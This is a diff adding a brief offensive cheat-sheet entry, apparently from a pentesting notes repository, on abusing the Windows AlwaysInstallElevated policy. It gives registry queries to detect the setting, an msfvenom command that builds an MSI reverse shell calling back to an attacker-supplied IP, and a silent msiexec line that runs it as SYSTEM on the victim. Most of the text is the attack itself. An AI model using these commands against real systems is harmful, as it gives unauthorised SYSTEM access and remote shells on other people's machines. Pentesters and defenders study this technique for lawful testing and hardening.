@@ -1,0 +1,18 @@
+AlwaysInstallElevated is a functionality which allows sys admins to install program as SYSTEM.
+As an attacker we can abuse this functionalities if it is enabled.
+We can enumerate it with below commands:
+
+-- reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+-- reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+* If both values are set to 1 AlwaysInstallElevated is enabled.
+
+** Can abuse it with following way:
+
+[ Create a msi reverse shell with following command. ]
+
+-- msfvenom -p windows/shell_reverse_tcp lhost=IP lport=80 -f msi -o shell.msi
+
+Then transfer it to victim machine. After transferring use below command to execute it as a SYSTEM. (Do not forget to listen on specified port in reverse shell.)
+
+-- msiexec /quiet /q /n /i shell.msi
